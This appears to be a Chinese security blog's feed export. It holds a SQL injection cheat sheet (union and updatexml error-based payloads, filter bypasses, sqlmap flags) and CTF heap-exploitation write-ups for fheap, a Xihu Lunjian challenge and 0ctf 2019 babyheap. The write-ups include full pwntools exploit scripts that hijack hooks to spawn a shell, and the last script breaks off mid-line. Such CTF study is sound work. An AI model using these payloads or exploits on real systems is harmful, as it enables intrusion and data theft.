    <content type="html"><![CDATA[<p>#Sql Injection</p><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><ol><li>注释： </li></ol><ul><li>–   （注意后面必须要留空格，否则无法达到注释的效果；</li><li>#</li></ul><ol start="2"><li>group_concat （连接字符串，一次性注入；</li></ol><h2 id="检测过滤字符"><a href="#检测过滤字符" class="headerlink" title="检测过滤字符"></a>检测过滤字符</h2><p>‘^(text)^’</p><p>如果text为假，那么页面就会显示正确，所以假如检测是否过滤union, 写入’^(length(union)==0)^’，如果正确就是过滤了</p><h2 id="应对过滤字符"><a href="#应对过滤字符" class="headerlink" title="应对过滤字符"></a>应对过滤字符</h2><ol start="0"><li>大小写绕过； 因为sql本身对大小写不敏感，也就是SELECT与 select本身是一致的，有的检查过松是可以通过大小写绕过的比如说 SeLEct</li><li>双写 ；因为很多情况下是将被过滤的字符替换为空，这种情况下就可以使用双写绕过，比如说 selselectect</li><li>/**/ ;</li><li>updatexml 报错注入;（最终内部细节与其他的基本一致；</li><li>concat被过滤：make_set() lpad()、reverse()、repeat()、export_set()（lpad()、reverse()、repeat()等冷门字符串处理函数</li><li>使用运算符号； 运算符进行运算的时候会先观察左右两端的数据类型是否相同，不同的话就会进行数据强制的转换；所以如果知道是字符串的话，会被强制转换为0；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from info where username=0; </span><br><span class="line">select * from info where username=&apos;admin&apos;-0-&apos;&apos;; --&gt;减法</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* table: </span><br><span class="line">select * from info where id=-1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) ;  --&gt; updatexml 三个参数，不随表行数变化。</span><br></pre></td></tr></table></figure><h2 id="mysql-约束攻击"><a href="#mysql-约束攻击" class="headerlink" title="mysql 约束攻击"></a>mysql 约束攻击</h2><p>由于mysql对于字符串验证不严格，因而在检验时，’admin’与’admin   ‘被认为是等价的，也就是说可以使非管理员用户以管理员身份读取数据库信息</p><p>## </p><h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure><h3 id="column"><a href="#column" class="headerlink" title="column"></a>column</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;info&apos;;</span><br></pre></td></tr></table></figure><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>-r + ‘filename’<br>-p + ‘sqlinjection_name’   –dbs<br>-D + ‘database_name’  –tables<br>-T + ‘table_name’     –columns<br>-C + ‘column_name’    –dump</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#Sql Injection&lt;/p&gt;
&lt;h2 id=&quot;常用语法&quot;&gt;&lt;a href=&quot;#常用语法&quot; class=&quot;headerlink&quot; title=&quot;常用语法&quot;&gt;&lt;/a&gt;常用语法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;注释： &lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;–   （注意后面
      
    
    </summary>
    
      <category term="web" scheme="http://siriuswhiter.tk/categories/web/"/>
    
    
      <category term="web" scheme="http://siriuswhiter.tk/tags/web/"/>
    
      <category term="sql" scheme="http://siriuswhiter.tk/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Pwn practice</title>
    <link href="http://siriuswhiter.tk/2019/03/29/pwn-practice/"/>
    <id>http://siriuswhiter.tk/2019/03/29/pwn-practice/</id>
    <published>2019-03-28T23:35:02.000Z</published>
    <updated>2019-06-03T00:46:29.629Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fheap"><a href="#fheap" class="headerlink" title="fheap"></a>fheap</h1><p>来源：<a href="https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c" target="_blank" rel="noopener">https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>只有两个功能：add delete</p><p>add 初始时会分配一个struct，然后会分两种情况： </p><ol><li>长度小于16时，不再申请新的chunk，原结构体的前十六个字节用于接收用户输入； </li><li>长度大于16时，会申请一个新的chunk，用于存放data，此时原结构体的前八个字节存放着指向新chunk的指针。</li></ol><p>原结构体的最后十六个字节，会分别存放size 及 对应的 free函数</p><p>这里可以看到输入的size没有任何卵用，后面还是根据输入的长度来确定的。</p><p>delete 会检查存放在bss段的指针，指针存在就可以释放</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>delete 函数有明显的漏洞，之前本来设置了inuse位，但是并没有检查，同时指针仅仅是free而没有置为空，所以可以double free;</p><p>还有问题就是指针同时存放在堆中，一般而言，这样很容易造成劫持；</p><p>不过这次没有show函数，也就是说，没有办法直接通过输出泄露地址，这样一般就需要劫持指针或者是最低位修改；</p><p>而且这次有个问题就是或许是因为没有设置缓冲区的原因，前面输入的chunk data在后面新建chunk会直接赋值过去，这样子造成如果初始时分配大的chunk,后面就没办法分配到小chunk了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">name = &apos;./pwnf&apos;</span><br><span class="line">p = process(name)</span><br><span class="line">elf= ELF(name)</span><br><span class="line"></span><br><span class="line"># puts_offset = 0xd1a </span><br><span class="line"># printf_pffset = 0xdbb</span><br><span class="line">def create(num,data):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;create &apos;)</span><br><span class="line">    p.recvuntil(&apos;Pls give string size:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;str:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line">    </span><br><span class="line">def delete(num):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;delete &apos;)</span><br><span class="line">    p.recvuntil(&apos;id:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;Are you sure?:&apos;)</span><br><span class="line">    p.send(&quot;yes&quot;)</span><br><span class="line">   </span><br><span class="line">create(5,&apos;a&apos;*5)     #0</span><br><span class="line">create(5,&apos;b&apos;*5)     #1</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">#leak</span><br><span class="line">pay1 = &apos;q&apos;*20 + &apos;s&apos;*4 + &apos;\x1a&apos;</span><br><span class="line">create(32,pay1)</span><br><span class="line">delete(1)</span><br><span class="line">p.recvuntil(&apos;s&apos;*4)</span><br><span class="line">puts_addr = u64(p.recv(6) + &apos;\x00\x00&apos;)</span><br><span class="line">proc_base = puts_addr - 0xd1a </span><br><span class="line">printf_addr = proc_base + 0x9d0</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">pay2 = &apos;a&apos;*8 + &apos;%30$p&apos; + &apos;s&apos;*11 + p64(printf_addr) </span><br><span class="line">create(32,pay2)</span><br><span class="line">delete(1)</span><br><span class="line">x = p.recv()</span><br><span class="line">libc_addr = int(x[8:22],16) - 0x3b5760</span><br><span class="line">system_addr = libc_addr + 0x42510</span><br><span class="line"></span><br><span class="line">#getshell</span><br><span class="line">p.sendline(&apos;&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">pay3 = &apos;/bin/sh;&apos; + &apos;s&apos;*16 + p64(system_addr) </span><br><span class="line">create(32,pay3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>ex师傅给的题，说是西湖论剑的一道题目，题目质量还是可以的，写一下。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>正常的堆，四个功能齐全，漏洞点也比较明显（虽然第一次被我直接跳过了。。）。在add的时候使用了自己的get_str函数,将最末尾置为了0，<br>也就是最近经常见到的off-by-null，不过就是这次分配时大小是固定的且libc为2.27，所以多了一些技巧性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall get_str(_BYTE *a1, int size)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  if ( size )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      read(0, &amp;a1[v3], 1uLL);</span><br><span class="line">      if ( v3 &gt; size - 1 || !a1[v3] || a1[v3] == &apos;\n&apos; )</span><br><span class="line">        break;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] = 0;</span><br><span class="line">    result = &amp;a1[size];</span><br><span class="line">    *result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    *a1 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>tcache机制需要绕过，同时也带来了一些便利，比如分配时不检查size<br>思路：</p><ol><li>绕过tcache，利用unsorted bin中残留的信息泄露libc</li><li>利用tcache， 根据其中残留的信息泄露heap</li><li>利用off-by-null，改变inuse位，伪造fake chunk触发unlink实现chunk extend</li><li>将重叠的堆块重新置入tcache中，修改fd到free_hook修改为one_gadget getshell</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;xihu&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;size:\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line">        sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf7,str(i)*0x20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#----------------unsorted bin leak libc-------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf8,&apos;&apos;)#0</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    add(0xf7,str(i)) #1-6</span><br><span class="line"></span><br><span class="line">add(0xf7, &apos;7&apos;) #7</span><br><span class="line">edit(7, &apos;a&apos; *  8)</span><br><span class="line">show(7)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)) - 0x3ebca0</span><br><span class="line">print &quot;libc: &quot;+hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#---------------tcache leak heap -------------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">edit(0,&apos;0&apos;)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x730</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#------fake chunk unlink #---chunk extend cover fd ptr--------------#</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_base + 0x850</span><br><span class="line">fake_chunk = chunk0_addr + 0x10</span><br><span class="line"></span><br><span class="line">pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)</span><br><span class="line"></span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">for i in range(1,7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    add(0xf7,str(i))</span><br><span class="line"></span><br><span class="line">add(0xf7,&apos;8&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(8)</span><br><span class="line">pay = p64(0)+p64(0x101)+p64(free_hook)</span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf7,&apos;&apos;)</span><br><span class="line">edit(8,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;fheap&quot;&gt;&lt;a href=&quot;#fheap&quot; class=&quot;headerlink&quot; title=&quot;fheap&quot;&gt;&lt;/a&gt;fheap&lt;/h1&gt;&lt;p&gt;来源：&lt;a href=&quot;https://github.com/zh-explorer/hctf2016-fheap/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2019-pwn&amp;re</title>
    <link href="http://siriuswhiter.tk/2019/03/26/0ctf-2019-pwn-re/"/>
    <id>http://siriuswhiter.tk/2019/03/26/0ctf-2019-pwn-re/</id>
    <published>2019-03-26T12:36:28.000Z</published>
    <updated>2019-04-17T15:13:10.662Z</updated>
    
    <content type="html"><![CDATA[<p><em>这次的0ctf真的溃不成军，看了一些题心态爆炸</em></p><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是和前两年一个风格，不过将2018的漏洞去掉了，在update时会有一个字节的溢出，溢出内容不可控，只能是’\x00’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall get_str2(__int64 des, unsigned __int64 size)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  ssize_t v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  while ( v3 &lt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(0, (void *)(v3 + des), size - v3);</span><br><span class="line">    if ( v4 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 += v4;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( *__errno_location() != 11 &amp;&amp; *__errno_location() != 4 )</span><br><span class="line">    &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(des + v3) = 0;          --&gt;   here</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当时只发现了这个漏洞，尝试了一会，当时想可能是需要把tcache填满或者把topchunk的size给消耗完(因为这次的size看上去比较小，有耗光的可能)，但是没有思路在于假如将topchunk size消耗完有什么用。遂放弃。</p><p>今天有wp出来了，出乎意料的，漏洞点确实只有这一个且前面的想法都差不多没有跑偏，但是后面缺少的的思路才是重点。</p><p>前面通过将size耗光，此时再申请时会触发consolidate，同时将之前fastbins中的的chunk归入unsorted bin,这样就有了泄露libc的机会， 通过trigger consolidation 的操作使得unsorted bin刚好覆盖到未free的chunk上，以此来泄露libc，同时也因此拥有了相当于任意地址写的机会。</p><p>同时利用此漏洞将size放入fastbin中，将chunk分配到main_arena处修改topchunk地址到malloc_hook上修改即可</p><p>问题有：</p><ol><li>申请chunk tcache与unsorted bin 的优先度？</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./babyheap&quot;)</span><br><span class="line">#sh = remote(&quot;111.186.63.20&quot;,&quot;10001&quot;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)#(&apos;libc-2.28.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line"></span><br><span class="line">def update(idx,size,con):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Content: &apos;,con)</span><br><span class="line">def delete(idx):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def shrink(size,cnt):</span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            allocate(size)</span><br><span class="line">            update(i,size,&apos;x&apos;*size)</span><br><span class="line"></span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">shrink(0x28,7)</span><br><span class="line">shrink(0x48,7)</span><br><span class="line">shrink(0x28,15)  #--&gt; which will be consolidate to unsorted bin</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">for i in range(7):  # 0-6</span><br><span class="line">    allocate(0x18)</span><br><span class="line">    update(i,0x17,&apos;1&apos;*0x17)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)     #7    # fastbins to unsorted bins and allocate from it;  malloc_consolidate won&apos;t consolidate tcache bins;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(7,0x38,&apos;2&apos;*0x38)  #shrink topchunk to 0x200</span><br><span class="line"></span><br><span class="line">allocate(0x18)     #8</span><br><span class="line">allocate(0x18)     #9</span><br><span class="line">for i in range(10,15): # 10 - 14</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;2&apos;*0x47)</span><br><span class="line">for i in range(1,7):  #1-6</span><br><span class="line">    delete(i)  </span><br><span class="line">delete(9)  #0x18</span><br><span class="line">delete(0)  #0x18</span><br><span class="line">delete(8)  #0x18</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38) #0   # consolidate again            !!!!!!!!! 因为此处之前的unsortedbin被shrink了，所以后面对unsorted bin的操作无法更新chunk 0的pre_size 位，造成在这次consolidate 的时候chunk 0尝试向后合并是根据自己没有更新成功的pre_size来合并的，所以出书先overflapping,从而可以泄露libc信息</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(10)</span><br><span class="line">sh.recvuntil(&apos;: &apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">libc.address = leak_addr- 0x3ebca0</span><br><span class="line">print hex(libc.address)</span><br><span class="line">main_arena = libc.address+ 0x3ebc40</span><br><span class="line">print hex(main_arena)</span><br><span class="line">one_gadget = libc.address+ 0x4f322</span><br><span class="line">print hex(one_gadget)</span><br><span 